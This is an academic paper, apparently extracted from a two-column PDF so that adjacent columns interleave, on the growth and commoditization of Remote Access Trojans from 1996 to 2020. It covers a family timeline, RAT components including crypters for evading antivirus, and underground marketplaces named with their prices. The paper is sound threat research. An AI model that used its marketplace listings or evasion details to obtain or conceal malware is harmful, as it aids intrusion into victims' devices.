@@ -1,0 +1,3402 @@
+Growth and Commoditization of Remote Access Trojans
+
+Veronica Valeros Sebastian Garcia
+Department of Computer Science Department of Computer Science
+
+Czech Technical University Czech Technical University
+Prague, Czech Republic Prague, Czech Republic
+
+valerver@fel.cvut.cz sebastian.garcia@agents.fel.cvut.cz
+
+Abstract—In the last three decades there have been significant remains to today, their use has evolved. In the last decade
+changes in the cybercrime world in terms of organization, type more and more RATs were used in espionage, financial
+of attacks, and tools. Remote Access Trojans (RAT) are an and state sponsored attacks [3]–[5]. While many of them
+intrinsic part of traditional cybercriminal activities but they had their source code leaked or open sourced, the market
+have become a standard tool in advanced espionage and scams for Fully Undetectable (FUD) RATs and special plugins
+attacks. The overly specialized research in our community matured. Nowadays, RATs have become a commodity.
+on Remote Access Trojans has resulted in a seemingly lack Despite the abundance of reports on individual RAT
+of general perspective and understanding on how RATs have families and attacks that use them [6], there is no previous
+evolved as a phenomenon. This work presents a new generalist research that looks at RATs as a whole. The growth and
+perspective on Remote Access Trojans, an analysis of their evolution of RATs appears to have escaped public attention
+growth in the last 30 years, and a discussion on how they so far. The lack of a more generalist research hinders
+have become a commodity in the last decade. We found that the understanding and development of new techniques and
+the amount of RATs increased drastically in the last ten years methods to better detect them.
+and that nowadays they have become standardized commodity This paper aims to start a discussion on RATs as a
+products that are no very different from each other. unique phenomenon that requires further study. We argue
+
+that in the last 10 years a shift has occurred in the threat
+Index Terms—remote access trojans, underground economy, landscape where RATs have become a commodity. This
+cybercrime, marketplaces, malware, commoditization work analyzes the growth of Remote Access Trojans, de-
+
+scribes their key technological elements, their functionality,
+1. Introduction and analyzes how they propagate. Furthermore, this work
+
+presents a timeline of the last 30 years of RATs evolution,
+Remote access software is a type of computer program a detailed overview of the most well-known RATs during
+
+that allows an individual to have full remote control of 2019-2020, and an analysis of how they have been commer-
+the device where the software is installed. Remote Access cialized.
+Tool refers to a type of remote access software used for The main question this research explores is, are Remote
+benign purposes, such as TeamViewer [1] or Ammyy Ad- Access Trojans a commodity in the underground? Answer-
+min [2], which are common tools used by billions of users ing this question, the contributions of this paper are:
+worldwide. Remote Access Trojans (RAT) are a special type
+of remote access software commonly used for malicious • The first and most comprehensive timeline of the
+purposes, where (i) the installation is done without user last 30 years of RATs.
+consent, (ii) the remote control is done secretly, and (iii) • An overview of the commoditization of the most
+the program hides itself in the system to avoid detection. well-known RATs in 2019-2020.
+The distinction between tools and trojans was created by • A first analysis on the types of attacks and attackers
+the information security industry to distinguish benign from using RATs.
+malicious RATs, however in the underground, attackers
+claim all RATs are Remote Access Tools. 2. Methodology
+
+Early Remote Access Trojans were used for pranks and
+for fun, to showcase skills, and to brag in hacking forums. To address the analysis of RATs we first searched and
+Developing your own RAT was an entry level skill that inex- methodologically analyzed a comprehensive list of Remote
+perienced users were somehow expected to rapidly acquire. Access Trojans since their first public appearance in 1996
+Websites like megasecurity.org were used to list and publish until 2018. These RATs, shown in the timeline of Figure 1,
+new RATs, many of which were never developed further. were found from public sources and inquiries with the
+While the challenge of building highly functional RATs community, and are the base tools analyzed in this work.
+
+
+
+The years 2019 and 2020 were not included in this research it. Upon execution the key will be used to automatically
+as the information available for this time is at the moment decrypt the original program. Crypters are used to avoid
+not comprehensive and incomplete. detection by anti-virus engines.
+
+We chose a small subset of RATs in order to study their
+specific characteristics, their users and how they are com- 3.2. Thirty Years Timeline of RATs
+mercialized. These RATs were selected using the following
+methodology. First, we searched on well-known forums for To better understand the growth and evolution of RATs,
+RATs that users were talking about or recommending to each it was necessary to investigate and build a corpus of the most
+other in the period from January 2019 to March 2020. We well-known Remote Access Trojans in history that had the
+consulted HackForums [7], Sinister.ly [8], and Nulled [9]. key technical elements described previously. We were able
+Second, taking as an input the list of RATs created in the to find, reference and document many RATs since 1996 to
+previous step, we searched for those RATs in websites that 2018 by looking at reports, code, and forums. These RATs
+were selling hacking tools, software, and other goods. Third, were also grouped in families, with slight variations of the
+we limited the scope of RATs to those that were being sold same RATs grouped together. The final list contains 337
+in two or more of the above mentioned marketplaces. Fourth, unique families of RATs, registering the first time seen, or
+we assembled the final list of RATs to study: WebMonitor date of the first public report about them.
+RAT, Android Voyager RAT, Remcos RAT, SpyNote RAT, The collected information was used to build the first and
+Luminosity Link RAT, Omni Android RAT, Ozone RAT, most comprehensive timeline of RATs to date. The timeline
+Imminent Monitor RAT, NanoCore RAT, NetWire RAT and is illustrated in Figure 1, and it is divided in three phases
+CyberGate RAT. Fifth, further information was collected shown in the figure as different dotted lines. The first phase
+from public intelligence sources such as blogs, news articles is from 1990 to 1999; the second phase is from 2000 to
+and forums on each of the selected RAT. 2009; and the third phase is from 2010 to 2018. In Figure 1
+
+we also highlight in bold pink color the 11 RATs that will
+3. Overview of Remote Access Trojans be analyzed in more detail in the following sections.
+
+The oldest RAT was first developed in 1996 [10], how-
+In order to define a common ground to further the ever legitimate Remote Access Tools were first created in
+
+understanding of RATs, we first introduce some of the key 1989 [11]. Since then, the number of RATs has grown
+technical elements of every Remote Access Trojan. Then rapidly. Figure 1 illustrates 337 of the most well-known RAT
+we present a timeline showing the growth of RATs over families during 1996–2018. The first period, 1996-1999,
+the last 30 years. Finally we discuss common functionality was marked by home-made RATs. In these years, everyone
+found among RATs. made their own RAT, however these did not prosper nor
+
+were heavily used. Among the most prominent ones were
+3.1. Key Technical Elements Back Orifice, Sub7 and Netbus, which together defined a
+
+generation by being innovative and disruptive. The second
+Remote Access Trojans have two key elements: client period, 2000-2009, showed a slight growth of more mature
+
+and server. Additional RATs components include the RATs, that were intended for fun but were started to be used
+builder, plugins and crypter. A RAT server is the program for attacks and profit. Among the highlights of this period
+installed on the victim’s device. The server is configured to are Gh0st, PoisonIvy and DarkComet. The third period,
+connect back to the attacker. The client is the program used 2010-2018, showed an important shift. RATs became a
+by the attacker to monitor and control infected victims: it commodity. The market matured, RAT sellers were expected
+allows the visualization of all active victims infections, dis- to provide support, new features, and in some cases even to
+plays general information about each infection, and allows host part of the infrastructure.
+to manually perform individual actions on each victim. The growth of RATs in the last decade depends on
+
+The builder is a program that allows to create new a combination of multiple factors. The maturity of the
+RAT servers with different configurations. When attackers cybercrime ecosystem, the specialization of work in the
+move infrastructure quickly, launch new attacks, and require underground communities, and interdependence of threat
+flexibility, builders save time and provide agility. actors are some of the key factors that led to an increase
+
+RATs come with certain fixed functionality. To add more in the demand of new and better malicious software, and
+capabilities, some RATs rely on plugins. Not all RATs offer RATs among them. To understand the real cause however,
+this capability, however the most used ones do, and good a more extended analysis and study is needed.
+plugins are craved by the cybercrime community. These
+plugins are one of the main differentiators in terms of cost 3.3. Functionality
+in the underground market.
+
+To be more efficient and hard to detect, attackers use The server-side functionality offered by each RAT will
+crypters to make the RAT servers Fully Undetectable (FUD). vary depending on the targeted platform and the intent for
+Crypters are programs that take a given program, read the which the RAT was created. There is not standardized set of
+code, encrypt it with a key, and automatically create a new features among RATs, however certain features are expected,
+program that contains the encrypted code and key to decrypt namely:
+
+
+
+Rurktar
+RATAttack
+DarkTrack
+
+Cobian RAT
+KhRAT
+
+RevCode
+AhMyth Android
+
+PowerRAT
+MacSpy
+
+DNSMessenger
+PentagonRAT
+
+xRAT
+NewCore
+
+AthenaGo
+Stitch RAT
+
+H- W0rm Pupy Basic RAT
+Kjw0rm GovRAT SilentBytes RAT
+
+Bozok Orcus Proton RAT
+Ghost/Ucul Rottie3 GhostCtrl
+
+Jspy Killer RAT RETADUP
+Jcage Hi- Zor RingRAT
+9002 Quaverse Iskander RAT
+
+SandroRAT Heseber CrossRAT
+Greame Cardinal EvilOSX
+
+Havex Jfect Kedi
+BlackHole Small Net Trochilus Micropsia
+
+Ahtapot SpyGate Matryoshka Overlay RAT
+Adwind CT RAT Hallaj PRO Parat (python, 
+
+Ammyy Admin MM RAT HellSpy gituhub)
+P. Storrie RAT Pitty Tiget JadeRAT RunningRat
+
+Seed RAT Paladin Skywyder SonicSpy
+SharpBot Leo RAT NanHaishu TelegramRAT
+
+Shady RAT Shadow Logger Wonknu UBoatRAT
+Vertex Shiz RAT Xena Vermin
+Xpert Alusinus Babylon A- RAT
+
+HellRaiser RARSTONE Storm RAT HeroRAT
+Hav- RAT IncognitoRAT Dragon Eye Mini EggShell TeleRAT
+xHacker VertexNet PCRat Moker/Yebot IRRAT
+ComRAT Cerberus Hupigon Galaxy RAT TV RAT / TVSpy Bondupdater
+4H RAT Apocalypse WinSpy KimJongRAT HttpBrowser RAT BrainDamage
+
+Turkojan Poison Ivy DarkNet RAT Venomous Ivy Novalite RAT GDRAT Os Celestial Caesar RAT
+Sub7 Gh0st HawkEye Bandook Punisher AAR Loki RAT Omega RAT RadRAT Pinky RAT
+
+MoSucker Lithium LokiTech Dark RAT Darkhotel Terminator RCIS by BKA KeyBoy Ozone RAT Comet Rat
+Deep Throat AWRC MadRAT ProAgent RAT LostDoor PcClient RAT Ruski RAT NanoCore OmniRAT Android Voyager
+
+D.I.R.T BF Evolution LetMeRule Vigilix IKlogger ZombieRAT Aryan RAT CyberGate Imminent Monitor Luminosity Link WebMonitor
+
+1996 1997 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018
+NokNok RAT Netbus Dolly Beast Nuclear Arabian- Attacker DarkComet BlackShades Netwire Dendroid Remcos Trooper RAT
+
+Back Orifice Optix Pro Bifrost MofoTro Shark RAT Xtreme RAT njRAT/Njw0rm BX Spynote MicroRAT
+Y3k Assasin Tequila Bandita Casper CIA RAT Deeper RAT FinSpy Mega Mangit CannibalRAT
+
+Vortex Net Devil Toquito Bandito BlackWorm Minimo Schwarze Sonne A32s RAT WiRAT LeGeNd LimeRAT
+Socket23 Theef Hacker's door Comfoo miniRAT Xploit Char0n 3PARA RAT Revenge- RAT Powershell RAT
+Girlfriend ProRAT Hydrogen hsidir Pain RAT Arctic R.A.T. Nytro BBS RAT vjw0rm 0.1 tRAT
+
+Acid Shivers A4zeta PlugX/Korplug Golden Phoenix Syla Konni RokRat Parasite HTTP RAT
+Casus LanFiltrator UNITEDRAKE GraphicBooting TorCT PHP RAT Felismus RAT Qarallax/qrat DogCall
+Grifin Nova RAT MegaTrojan Pocket RAT Cobalt Strike Quasar RAT Ratty Vayne RAT
+
+Troyano Argentino Pandora Derusbi Erebus Sakula Xsser/mRAT MoonWind KevDroid
+Greek Hackers RAT Gimmiv.A SharpEye hcdLoader DroidJack TheFat RAT PubNubRAT
+
+MRA RAT RCS VorteX Xyligan Setro RAT RedLeaves AsyncRAT
+Snoopy Predator Pain Archelaus Beta jRAT/JacksBot Vantom BlueShades OverSeer RAT
+
+Sparta RAT Vanguard Blue Banana LuxNet NOPEN
+Syndrome RAT Crimson Cohhoc iSpy
+
+5p00f3r.N$ RAT Jacksbot COMpfun Lilith
+SpyNet Arcom Zxshell Remvio RAT
+
+Dark Moon Black Nix DeputyDog htpRAT
+Adzok/Adsocks Client Mesh HijackRAT BetterRAT
+Dameware RAT MirageFox GimmeRat Coldroot RAT
+
+LeoUncia Winnti Krysanec FALLCHILL
+VinSelf IcoScript PlasmaRAT Flawed Ammyy
+
+DerSpaeher GlassRAT OrcaRAT Shadow Tech
+Bioazih RMS BlackNess NavRAT
+
+Flu Project Matrix / Hikit DNSChan RAT Gravity RAT
+MSpy MacControl Crimsom InnaputRAT
+
+Oko Szefa China Chopper Spygofree 888 RAT
+Bisonal/Korlia Rabasheeta SzefPatrzy Maus RAT
+
+Graeme Diamond RAT Loda RAT
+AndroRAT
+Szefpatrzy
+
+Figure 1. Timeline of 337 well-known Remote Access Trojans families during 1996-2018, ordered by year of first seen or reported by the community.
+The timeline is divided in three phases marked by dotted lines. The last phase clearly shows a significant growth compared with the previous phases. In
+bold pink we highlight the 11 RATs this research focuses on.
+
+
+
+• Webcam: take screenshots or full video recording able to offer additional services, extended functionality or
+through the victim’s webcam. technical support. No matter the skill level, attackers are
+
+• Microphone: access the microphone to record audio. able to chose from a wide range of very affordable options
+• Display: take screenshots or full screen recording of and adjust their attack to the final product selected. Most
+
+the victim’s desktop. RATs do not have a huge technological advantage, but better
+• Keylogger: capture keystrokes from the victim. reviews, recommendations and in the end, better marketing.
+• System: perform system operations such as retriev-
+
+ing system information, file management, hard drive 4.1. Overview of the Eleven Selected RATs
+and RAM access, installing programs, and other.
+
+• Peripherals: access to peripherals devices including
+Bluetooth, CD/DVD reader, and others. The selected RATs, as summarized in Table 1, are
+
+WebMonitor RAT, Android Voyager RAT, Remcos RAT,
+The quality of the RATs however does not only depend SpyNote RAT, Luminosity Link RAT, Omni Android
+
+on the server side functionality. On the client-side, the RAT, Ozone-RAT, Imminent Monitor RAT, NanoCore RAT,
+following factors are considered important: NetWire RAT and CyberGate RAT. These RATs are also
+
+highlighted on Figure 1 in bold pink color.
+• Stealthiness: the more stealth and hard to detect the
+
+RAT is, the better. CyberGate RAT was first seen in 2011 [19]. The client is
+written in Delphi, the server is believed to be written in C++
+
+• Stability: server and client stability are paramount
+qualities of a successful RAT. and is very lightweight, 40 KB uncompressed. It seems to
+
+share part of its code with an earlier RAT known as Xtreme
+• Graphical interface: the more user friendly the client
+
+control panel, the better. RAT from 2010, whose source code was leaked [20]. This
+RAT targets specifically Windows machines, both 32Bit and
+
+• Encryption: traffic encryption is very important to
+hide the content in the network. 64Bit. Its key functionalities include keylogger, screenshot
+
+logger, password recovery and microphone capture.
+• Dependencies: the fewer dependencies needed for a
+
+RAT to work, the better. NetWire RAT was first seen in 2012 [21] and is multi-
+platform, being able to target not only Windows machines,
+but also Mac, Linux and Android. Both client and server
+
+3.4. Propagation Methods are written in C. It offers full remote access with traditional
+functionalities such as keylogger, system management, pass-
+
+The distribution and propagation of Remote Access Tro- word recovery and others. It allows heavy customization.
+jans rely heavily on social engineering. Social engineering Imminent Monitor RAT, also known as IM-RAT, was
+refers to the psychological manipulation of humans into first seen in 2012 [22]. It targets Windows machines, and
+acting in a desired way, usually with the aim of obtaining both client and server are written in .NET. Imminent Mon-
+information or in this case, installing a malicious program. itor was commercialized as a benign administration tool,
+
+Traditional phishing and spear phishing campaigns are however researchers confirmed that some of its functional-
+the preferred method to distribute RATs using malicious ities made the RAT undetectable for the victim, including
+attachments [12]–[15]. Some Facebook pages were also recording from the webcam undetected by turning off the
+known for luring users to install RATs [16]. These pages webcam light [23]. A version of Imminent Monitor allowed
+contain links to download what looked like normal software, attackers to run a cryptocurrency miner on the infected
+which in reality would download RATs. Channels in secure machine.
+messengers such as Telegram and WhatsApp were also NanoCore RAT was first publicly seen in 2013, while
+known to spread malicious links that would lead to RATs its author started coding it on late 2012 [24]. Bot client and
+[17], [18]. server are written in .NET. The source code of NanoCore
+
+has been leaked multiple times, and while the original
+4. Commoditization of RATs author was arrested there are versions of it still being sold
+
+today. NanoCore was reported to be used for state-sponsored
+Just like other types of malware, RATs are openly attacks [3]. Among its features it offers a plugin system to
+
+commercialized. This section provides insights on eleven extend its functionality, remote chat, and uPnP support.
+selected RATs that were more recommended by users in Luminosity Link was first seen in 2015 [25], targets
+forums during 2019-2020. This section will focus on their Windows machines and both client and server are written in
+characteristics, special features, and provide insights of their .NET. The source code was leaked, however it is still being
+commercialization on different marketplaces. sold even though the author was arrested [26].
+
+Based on the analysis of the market it is possible to say Omni Android RAT, also known as OmniRAT, was first
+that far from being custom-made unique tools, RATs have seen in 2015 [27]. This RAT is multi-platform, allowing
+become a commodity. They have become a group of stan- to target Windows, Mac, Linux and Android victims. For
+dardized products that are not very different from each other. Android devices it allows to retrieve a high number of infor-
+The variation of prices is not given by the functionality of mation, including battery level, widgets installed, Bluetooth,
+the RATs per se, but instead by the sellers themselves being calls, and many others.
+
+
+
+TABLE 1. TECHNICAL OVERVIEW OF ELEVEN OF THE MOST COMMON RATS DURING 2019-2020
+
+RAT First
+Seen Targeted Platform Used in Client Source Server Source
+
+targeted attacks Code Language Code Language
+CyberGate RAT 2011 Windows Yes Delphi C++
+NetWire RAT 2012 Windows, Mac, Linux & Android Yes C C
+Imminent Monitor RAT 2012 Windows Yes .NET .NET
+NanoCore RAT 2013 Windows Yes .NET .NET
+Luminosity Link RAT 2015 Windows Yes .NET .NET
+Omni Android RAT 2015 Windows, Mac, Linux & Android Yes Java Java
+Ozone RAT 2015 Windows Yes C++ C++
+Remcos RAT 2016 Windows Yes C++ C++
+SpyNote RAT 2016 Android Unknown Visual Basic Java
+Android Voyager RAT 2017 Android Unknown Java Java
+WebMonitor RAT 2017 Windows, Linux, Mac & Google OS Unknown C++ C++
+
+Ozone-RAT was created in 2015 [28]. Both client and common standardization of features to compare RATs. For
+server are written in C++, and it targets specifically Win- instance, for the CyberGate RAT we could find more than 70
+dows machines. It offers traditional functionalities such as individual features [34], while for NetWire the user manual
+remote desktop, keylogger and system management. One of only lists a few dozen [35]. While at first sight CyberGate
+the main highlights of this RAT is that it offers a hidden seems to have more features, that is not the case. The only
+VNC functionality. difference is that the features described for CyberGate are
+
+Remcos RAT was first seen in 2016 [29]. Both client more detailed than those for NetWire, making a comparison
+and server are written in C++ making it lightweight. Remcos a difficult task.
+targets 32Bit and 64Bit Windows machines. Its functionality
+includes uploading and downloading files, system manage- 4.2. Marketplaces
+ment, and keylogger. There are several variants observed in
+the wild, which suggest that the source code may have been Just like other malware, RATs are openly commercial-
+leaked. ized through forums and marketplaces. In this paper we fo-
+
+SpyNote RAT version 2 was first seen in 2016 [30], cus on six marketplaces selling RATs among other hacking
+however it may have been created earlier. The client is tools and services. The selected marketplaces are shown on
+written in Visual Basic, and the server in Java. It targets Table 2, along with a summary of the RATs offered in each
+Android devices. Among its functionality it includes the market and their prices.
+ability to access contacts, listen to calls, access front and Although the majority of well-known RATs are open-
+back cameras, read SMS, and system management without source or had their code leaked, sellers commercialize RAT
+requiring root access. The builder of SpyNote was leaked packages. These include the fully undetectable RAT with
+[31] and thus, multiple versions have been observed of this plugins and its builder. Sellers may sell the RAT once, or
+RAT. may offer subscriptions for a limited time. Subscriptions are
+
+Android Voyager RAT, also known as Voyager RAT, was sold in tiers, such as Basic, Premium and Pro, or Startup,
+first seen in 2017 [32]. Both client and server are written in Small Business and Enterprise. When sold via subscriptions,
+Java, and its author claims to be original and not based the offerings vary according to the number of simultaneous
+from other leaked RAT. It targets Android devices. The clients, functionality, number of plugins included, and con-
+functionality offered depends on whether there is root access current tasks executed.
+on the device or not. Among the novel features, it claims that DaVinciCoders (codevinci.pw) is a website that sells
+with root access it can survive factory reset on the Android Microsoft Office exploits, crypters, keyloggers, RATs and
+device. botnets. It has four RATs for sale: Imminent Monitor,
+
+WebMonitor RAT was first seen in 2017 [33]. Both NanoCore, Luminosity Link, and Ozone RAT. It offers
+client and server are written in C++. WebMonitor targets plugins and support. This market sells the RAT, without
+Windows, Linux, Mac and Google OS. It’s designed to be an licensing, thus having lower prices than other markets. The
+enterprise class RAT able to compete with TeamViewer and payment is handled via rocketr.net, however at the time of
+other commercial remote access software. It offers stability, writing, the site has banned the products due to violations
+full remote control, and the management of clients through of their terms of services.
+a web page being multi-platform on the client side as well. Secret Hacker Society (secrethackersociety.com) is
+
+a website that sells exploits, botnets, RATs, keyloggers,
+4.1.1. RAT Features. In terms of functionality, all the crypters, tutorials and hardware devices. It has nine RATs
+selected RATs provide the same basic features as described for sale with prices ranging from 55 USD to 200 USD.
+in Section 3.3. These features however are complemented Some RATs are offered through licensing and special FUD
+by additional features that characterize and differentiate features, leading to higher prices than other markets. Pay-
+RATs among each other. However until today, there is not a ments are handled via perfectmoney.is or Bitcoin.
+
+
+
+TABLE 2. COMMERCIALIZED PRICES OF RATS IN ONLINE MARKETPLACES
+
+Sellers and Marketplaces (USD)
+RATs DaVinciCoders Secret Hacker Society buyallrat588 Dorian Docs FUD Exploits Ultra Hacks
+CyberGate RAT - 200 30-65 - - -
+NetWire RAT - 120 - - 120 180
+Imminent Monitor RAT 45 - 50-120 20-70 20-100 -
+NanoCore RAT 45 96 - - 150-170 -
+Luminosity Link RAT 75 55 - - 150 -
+Omni Android RAT - 80 60-150 120 120 180
+Ozone RAT 75 - - - 170 -
+Remcos RAT - 99 - - 170 -
+SpyNote RAT - 69 80-140 - 150-170 69
+Android Voyager RAT - 90 30-65 30-150 30 55-250
+WebMonitor RAT - - - 60-120 60 70-140
+
+Buy All Rat (buyallrat588.com) is a website that sells sectors or type of crimes they focus on. In contrast with
+hacking software, RATs, Exploits, Spoofers, Private Mailers, botnets, RATs are precision tools that excel in targeted
+SMTP, Bot Nets, crypters, Shells, VPNs, keyloggers and attacks meant to extract specific information from victims.
+other. It has five RATs on sale on two tiers: Basic and Pro. RAT attacks differ from most malware attacks in several
+Pro licenses are more expensive as their include typically aspects. First, contrary to botnets where an attacker controls
+lifetime access, technical support, one week money back all the bots simultaneously, attackers control each RAT
+guarantee, and more than one device licensing. The seller infection manually. Second, due to this individual control
+doesn’t perform direct sales, customers need to send an of each victim, the sequence of actions on the victims may
+email request and all exchange is done privately. never be the same in two infections. Third, the number
+
+Dorian Docs (doriandocs.com) is a website that sells of simultaneous infections that an attacker can control are
+accounts, RATs, fake IDs and fake documents. It has four limited by the skill of the attacker. No attacker will be able
+RATs on sale and each RAT has a different tier: single price, to control half a million victims as with botnets.
+Business/Professional, Startup/Small Business/Business, 1
+month/3 months/6 months/Lifetime. Payments are made 5.1. Business Email Compromise
+with cryptocurrency, accepting Bitcoin, Monero, Ethereum
+and Litecoin.
+
+FUD Exploits (fudexploits.com) is a website that sells Business Email Compromise (BEC) is a type of scam
+botnets, crypters, passports, RATs, and other products. It has directed at companies or organizations that pay their sup-
+ten RATs on sale, and it offers different RAT packages at pliers via wire transfers [36]. In BEC attacks, attackers use
+different prices, varying on versions, number of plugins, and different techniques with the aim of redirecting the transfer
+support. Payments are made using Bitcoin. of funds to attackers’ accounts instead of the legitimate ones,
+
+Ultra Hacks (ultrahacks.org) is a website that sells thus stealing the money. While traditionally information
+tutorials, RATs, botnets, hardware, and services. It has five stealers were the preferred tool in BEC attacks, there has
+RATs on sale, only two of them are offered in two tiers been a shift and nowadays the use of RATs is becoming the
+Professional/Premium, the rest is offered in a single option. norm [37].
+The seller accepts payments in Bitcoin, Monero, Litecoin,
+direct by transfer SEPA, cash on delivery and Perfect Money. 5.2. Espionage
+
+The variation in price depends on the how fully unde-
+tectable the RAT is and on the type of license purchased, if RATs are designed for spying on victims, and cyber
+any. In terms of detection, a RAT can be detectable, fully espionage is the type of attack where they excel at. Cyber
+undetectable at runtime, fully undetectable at scan time (AV espionage attackers may develop their own RATs [38],
+scans), or both. The price will also depend on the type of [39], or use well-known commercial RATs for their op-
+license. Markets such as DaVinciCoders sell just the RAT erations. Advanced attackers, like the Tonto APT group,
+without any type of license, leading to lower prices. Markets has been known to use the same self-developed RAT for
+such as FUD Exploits sell the license to use the RAT for a over a decade [40]. There are pros and cons of using well-
+number of devices, typically 1 device. Licenses can be for known RATs for a highly confidential operation. Using well-
+a finite time, or infinite, leading also to higher prices. known RATs may leave unnecessary tracks that could lead
+
+to identify the attacker, and the RAT may not have all the
+5. Characterizing Attacks needed functionality. Additionally, commercially available
+
+RATs may not provide enough stability or the stealthiness
+To better understand the market and context of these required for cyber espionage activities. However, developing
+
+RATs, this section provides a first analysis of different a custom-made RAT can clearly help identify the attacking
+known types of attacks done with RATs and the different group very easily and help in attribution.
+
+
+
+5.3. Targeted Attacks 7. Conclusion
+
+Targeted attacks are attacks that are carefully planned, We have presented a first overview of the growth of
+target a very narrow set of victims, and have often a Remote Access Trojans by visualizing the 337 most well-
+specific goal. RATs are widely used in this type of known families during 1996-2018. This generalist overview
+attacks. From the eleven RATs mentioned in the pre- provides an understanding of how this type of malicious
+vious section, 9 of them were used in targeted at- software has grown over the last three decades. Insights
+tacks [41] [42] [43] [44] [45] [46] [47] [48] [49]. The on eleven of the most prominent RATs during 2019-2020
+majority of the reports on RATs used on targeted attacks regarding their commercialization in online marketplaces
+focus on the delivery method and not on how the malware showed that RATs are technologically not so different from
+was used. It is generally understood that RATs are mainly each other. The main differences are in prices due to the
+used to monitor the infected device, steal documents, and added features or additional services offered by the sellers
+steal credentials that can be used to move laterally on the themselves. While it is still believed that real hackers will
+compromised organization. create their own RAT, business oriented cybercriminals will
+
+look for stability, simplicity, support, and guarantee; thus
+6. Characterizing Attackers buying RATs instead of crafting their own. These commer-
+
+cial characteristics of RATs mark them as a commodity.
+RAT users are not homogeneous. They can be sep- Shifts in cybercriminal activities continue to happen and
+
+arated in three groups according to their aim: (i) users RATs are used more and more in all type of attacks. Their
+that use RATs for educational purposes, fun or pranks, (ii) continual growth challenges current detection methods and
+for advanced attacks and espionage activities, and (iii) for asks for further research that focuses on RATs as a general
+cybercrime (whether selling RATs to other actors or buying malware class and not only in individual RAT families.
+RATs for attacking).
+
+Acknowledgment
+6.1. Educational Purposes
+
+The authors would like to thank the Czech Technical
+Attackers using RATs for educational purposes, fun or University for its support. The authors would also like to
+
+pranks rarely purchase commercial RATs. They will likely thank all the individual researchers that shared information
+write their own or modify existing ones. The renowned and helped during the last three years in building the RAT
+development platform GitHub [50] contains dozens or hun- timeline.
+dreds self-made RATs created and shared publicly with
+the disclaimer of being for education purposes only. In References
+underground forums, the hacker community still believes
+that real hackers will create their own RAT, which incentives [1] TeamViewer: remote access, remote control and remote support
+this activity. solution, TeamViewer Germany GmbH. [Online]. Available: https:
+
+//www.teamviewer.com/
+
+6.2. Advanced Attacks [2] Ammyy Admin: Remote Desktop Software and Remote Desktop
+Connection, Ammyy, Inc. [Online]. Available: http://www.ammyy.co
+m/
+
+State sponsored attackers and cyber crime organizations [3] E. Kovacs, “Nation-State Actors Use Fileless Tricks to Deliver
+are believed to create their own tools customized to their RATs,” 2016. [Online]. Available: https://www.securityweek.com/nat
+own needs. An exemplary case in this category is the Tonto ion-state-actors-use-fileless-tricks-deliver-rats
+APT Group that developed their own RAT and used it for [4] W. R. Marczak, J. Scott-Railton, M. Marquis-Boire, and V. Paxson,
+more than a decade [40]. The use of open source tools “When governments hack opponents: A look at actors and technol-
+however may be useful in some scenarios to give false flags ogy,” Proceedings of the 23rd USENIX Security Symposium, pp. 511–
+or as a distraction. 525, 2014.
+
+[5] K. J. Higgins, “Schneider Electric: TRITON/TRISIS Attack Used
+0-Day Flaw in its Safety Controller System, and a RAT,” 2018.
+
+6.3. Cybercrime [Online]. Available: https://www.darkreading.com/vulnerabilities---
+threats/schneider-electric-triton-trisis-attack-used-0-day-flaw-in-its
+
+Traditional cybercrime groups are the ones engaged in -safety-controller-system-and-a-rat/d/d-id/1330845
+
+commercializing RATs. Sellers will use available RATs, [6] M. Rezaeirad, B. Farinholt, H. Dharmdasani, P. Pearce, K. Levchenko,
+modify or enhance them, package them and sell them. They and D. McCoy, “Schrödinger’s RAT: Profiling the stakeholders in
+will offer technical support, tutorials, and hosting services. the remote access trojan ecosystem,” in 27th USENIX Security
+
+Symposium (USENIX Security 18). Baltimore, MD: USENIX
+Buyers do not want to get absorbed in technical details and Association, Aug. 2018, pp. 1043–1060. [Online]. Available: https:
+programming, they look to focus on the attacks. Buyers rely //www.usenix.org/conference/usenixsecurity18/presentation/rezaeirad
+on sellers to provide stable tools, with support, and ability [7] HackForums, accessed on March 5, 2020. [Online]. Available:
+to develop further modules for them in case they need them. https://www.hackforums.net/
+
+
+
+[8] Sinesterly Forum, accessed on March 5, 2020. [Online]. Available: [27] N. Chrysaidos, “Droidjack isn’t the only spying software out there:
+https://sinister.ly/ Avast discovers omnirat,” accessed on March 6, 2020. [Online].
+
+[9] Nulled Forum, accessed on March 5, 2020. [Online]. Available: Available: https://blog.avast.com/2015/11/05/droidjack-isnt-the-onl
+https://www.nulled.to/ y-spying-software-out-there-avast-discovers-that-omnirat-is-currentl
+
+y-being-used-and-spread-by-criminals-to-gain-full-remote-co
+[10] MegaSecurity, NokNok 5.0, accessed via Internet Archive. [Online]. [28] “Honest ozone rat review,” accessed on March 6, 2020. [Online].
+
+Available: https://web.archive.org/web/20081201090344/http: Available: https://raidforums.com/Thread-Honest-Ozone-Rat-Review
+//www.megasecurity.org/trojans/n/noknok/Noknok5.0.html
+
+[29] A. Hinchliffe, “Emea bi-monthly threat reports: Turkey, saudi arabia
+[11] N. House, NetSupport Manager - Multi-Platform Remote Control & united arab emirates,” accessed on March 6, 2020. [Online].
+
+software, accessed on March 6, 2020. [Online]. Available: Available: https://unit42.paloaltonetworks.com/unit42-emea-bi-mon
+http://www.netsupportmanager.com/ thly-threat-reports-turkey-saudi-arabia-united-arab-emirates/
+
+[12] X. Zhang, NetWire Being Spread via Phishing Email, accessed on [30] “Spynote [ android rat ] v2.3 server setting,” accessed on March
+March 6, 2020. [Online]. Available: https://www.fortinet.com/blog/ 7, 2020. [Online]. Available: https://www.youtube.com/watch?v=voe
+threat-research/new-netwire-rat-variant-spread-by-phishing.html LG1H6qSY
+
+[13] S. Gatlan, Phishing Campaign Delivers Quasar RAT Payloads via [31] J. Soo, “Spynote android trojan builder leaked,” accessed on March
+Fake Resumes, accessed on March 6, 2020. [Online]. Available: 7, 2020. [Online]. Available: https://unit42.paloaltonetworks.com/un
+https://www.bleepingcomputer.com/news/security/phishing-campaign it42-spynote-android-trojan-builder-leaked/
+-delivers-quasar-rat-payloads-via-fake-resumes/
+
+[32] “Voyager rat,” accessed on March 6, 2020. [Online]. Available:
+[14] Kaspersky Lab, “Chinese-speaking apt actor caught spying on https://hackforums.net/showthread.php?tid=5723439
+
+pharmaceutical organizations,” accessed on March 6, 2020. [Online].
+Available: https://www.kaspersky.com/about/press-releases/2018 chi [33] “Webmonitor pc [#1 rat on the market, c++/native (no .net), no
+nese-speaking-apt-actor-caught-spying-on-pharmaceutical-organiza portforward, keylogger],” accessed on March 6, 2020. [Online].
